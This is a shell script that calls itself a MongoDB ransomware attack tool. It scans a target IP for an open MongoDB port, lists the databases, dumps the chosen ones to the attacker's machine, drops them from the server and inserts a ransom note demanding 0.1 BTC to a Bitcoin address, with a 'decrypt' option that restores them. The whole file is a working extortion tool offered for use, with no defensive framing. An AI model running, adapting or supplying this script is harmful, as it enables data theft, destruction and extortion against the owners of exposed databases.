#!/bin/sh

# declare mongodb port
PORT=27017
ADDR=$1
BITCOIN_ADDR="1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX" # sample bitcoin address
# create banner function

banner() {
	# banner
	echo "Mongodb Ransomware Attack Tool v1.0"
	echo "Author: @peculiardev"
	echo "Date: 2023-06-14"
	echo "Description: This tool is used to attack mongodb database and encrypt the data"
	echo "Usage: ./script.sh <ip>"
	echo "Example: ./script.sh 192.168.43.1"
}

# check if ip is provided
if [ -z "$1" ]; then
	echo "Please provide the ip address of the mongodb server"
	exit 1
fi

# checking if mongodb port is open using nmap
echo "check mongodb port..."
nmap -p $PORT $1 | grep open >/dev/null
isOpen=$?
if [ $isOpen -eq 0 ]; then
	echo "mongodb port is open"
else
	echo "mongodb port is closed"
	exit 1
fi

listDatabases() {
	echo "list all databases..."
	echo "=============================="
	mongo --host $ADDR --port $PORT --eval "printjson(db.adminCommand('listDatabases'))" | grep name | cut -d "\"" -f 4
	echo "=============================="
}

encrypt() {
	echo -n "Enter database name: " && read dbName
	if [ -z "$dbName" ]; then
		echo "Please provide the database name"
		exit 1
	fi

	if [ $dbName = "admin" ]; then
		echo "You cannot encrypt admin database"
		exit 1
	fi

	# if * is provided, encrypt all databases
	if [ $dbName = "*" ]; then
		echo "encrypting all databases..."
		databases=$(mongo --host $ADDR --port $PORT --eval "printjson(db.adminCommand('listDatabases'))" | grep name | cut -d "\"" -f 4)
		for db in $databases; do
			if [ $db = "admin" ]; then
				echo "You cannot encrypt admin database"
				exit 1
			fi
			# backup database
			mongodump --host $ADDR --port $PORT --db $db /o $ADDR
			# remove database from mongodb
			mongo --host $ADDR --port $PORT --eval "db = db.getSiblingDB('$db');db.dropDatabase();"
			# set message that database is encrypted
			echo -n "Enter message: " && read message

			# set default message
			if [ -z "$message" ]; then
				message="Your database is encrypted,  please pay 0.1 BTC to $BITCOIN_ADDR, if you want to decrypt your database"
			fi
			mongo --host $ADDR --port $PORT --eval "db = db.getSiblingDB('$db');db.message.insert({message: '$message', encrypted: true});"
		done
		exit 1
	else
		echo "encrypting database..."
		# backup database
		mongodump --host $ADDR --port $PORT --db $dbName /o $ADDR
		# delete database
		mongo --host $ADDR --port $PORT --eval "db = db.getSiblingDB('$dbName');db.dropDatabase();"
		# set message that database is encrypted
		echo -n "Enter message: " && read message

		if [ -z "$message" ]; then
			# set default message
			message="Your database is encrypted,  please pay 0.1 BTC to $BITCOIN_ADDR, if you want to decrypt your database"
		fi
		mongo --host $ADDR --port $PORT --eval "db = db.getSiblingDB('$dbName');db.message.insert({message: '$message', encrypted: true});"
	fi
}

decrypt() {
	echo -n "Enter database name: " && read dbName
	echo "decrypting database..."

	if [ -z "$dbName" ]; then
		echo "Please provide the database name"
		exit 1
	fi

	if [ $dbName = "admin" ]; then
		echo "You cannot decrypt admin database"
		exit 1
	fi

	if [ "$dbName" = "*" ]; then
		echo "decrypting all databases..."
		databases=$(ls /$ADDR/)
		for db in $databases; do
			if [ $db = "admin" ]; then
				echo "You cannot decrypt admin database"
				exit 1
			fi
			# restore database
			mongorestore --host $ADDR --port $PORT --db $db /o /$ADDR
			# delete message
			mongo --host $ADDR --port $PORT --eval "db = db.getSiblingDB('$db');db.message.remove({});"
		done
		exit 1
	else
		# restore database
		mongorestore --host $ADDR --port $PORT --db $dbName /o /$ADDR
		# delete message
		mongo --host $ADDR --port $PORT --eval "db = db.getSiblingDB('$dbName');db.message.remove({});"
	fi
}

isLoop=1

while [ $isLoop -eq 1 ]; do
	echo "1. List all databases"
	echo "2. Encrypt database"
	echo "3. Decrypt database"
	echo "4. Show banner"
	echo "5. Exit"
	echo -n "Enter your choice: " && read choice
	if [ $choice -eq 1 ]; then
		listDatabases
	elif [ $choice -eq 2 ]; then
		encrypt
	elif [ $choice -eq 3 ]; then
		decrypt
	elif [ $choice -eq 4 ]; then
		banner
	elif [ $choice -eq 5 ]; then
		isLoop=0
	else
		echo "Invalid choice"
	fi
done
